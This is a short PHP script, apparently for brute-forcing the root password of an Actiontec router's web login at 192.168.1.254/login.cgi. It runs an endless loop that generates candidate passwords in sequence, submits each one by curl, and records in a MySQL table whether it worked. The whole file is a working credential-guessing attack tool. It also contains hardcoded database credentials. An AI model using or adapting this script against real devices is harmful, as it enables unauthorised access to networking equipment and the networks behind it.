<?php
error_reporting(E_ALL);

//:: Define the database connection
mysql_connect("localhost", "actiontec", "actiontec");
mysql_select_db("actiontec");

//::includes
require_once ('db.php');
require_once ("curl.php");
require_once ("sequence.php");

//::Classes
$DB = new DB();

$curl = new Curl();
$curl->url = "192.168.1.254/login.cgi";
$curl->username = "root";

$last = $DB->selectWhere('passwords', null, 'AND', 'ID DESC LIMIT 1');
$last = $last[0]['password'];

$sequence = new Sequence($last);

while (true) {
	$sequence->run();
	$curl->password = $sequence->getStr();
	$return = $curl->run();

	//::If there is not an error.
	if (!$curl->stringExists('index.html?msg=err')) {
		$DB->insertTableRow('passwords', array('password' => $sequence->getStr(), 'worked' => 1));
	} else {//If there is an error.
		$DB->insertTableRow('passwords', array('password' => $sequence->getStr(), 'worked' => 0));
	}
}

die();
